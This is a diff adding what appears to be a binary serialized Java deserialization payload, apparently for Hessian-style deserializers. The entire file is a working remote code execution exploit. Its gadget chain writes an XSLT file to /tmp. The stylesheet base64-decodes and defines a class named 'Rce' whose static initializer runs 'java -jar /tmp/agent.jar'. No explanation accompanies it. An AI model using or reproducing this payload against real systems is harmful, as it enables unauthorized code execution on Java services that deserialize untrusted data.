@@ -1,0 +1,16 @@
+CC0!sun.security.pkcs.PKCS9AttributesîignoreUnsupportedAttributes
+attributespermittedAttributesderEncoding`FMjavax.swing.UIDefaultsC0"sun.security.util.ObjectIdentifierìcomponentLenencoding
+componentsaè)*ÜHÜ˜	NCsun.swing.SwingLazyValueì	className
+methodNameargsb08com.sun.org.apache.xml.internal.security.utils.JavaUtilswriteBytesToFilenamer[object/tmp/2.xsltB9<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:b64="http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder"
+xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
+xmlns:th="http://xml.apache.org/xalan/java/java.lang.Thread"
+xmlns:ru="http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils"
+>
+    <xsl:template match="/">
+      <xsl:variable name="bs" select="b64:decodeBuffer(b64:new(),'yv66vgAAADQAKAoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMUmNlOwEACDxjbGluaXQ+AQAEdmFyMQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAB0BAApTb3VyY2VGaWxlAQAIUmNlLmphdmEMAAoACwcAIgwAIwAkAQAYamF2YSAtamFyIC90bXAvYWdlbnQuamFyDAAlACYBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoAJwEAA1JjZQEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAACAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAABwAOAAAADAABAAAABQAPABAAAAAIABEACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAACgAJAA0ADAALAA0ADAAWAA4ADgAAAAwAAQANAAkAEgATAAAAFAAAAAcAAkwHABUJAAEAFgAAAAIAFw==')"/>
+      <xsl:variable name="cl" select="th:getContextClassLoader(th:currentThread())"/>
+      <xsl:variable name="rce" select="ru:defineClass('Rce',$bs,$cl)"/>
+      <xsl:value-of select="$rce"/>
+    </xsl:template>
+  </xsl:stylesheet>ZNN
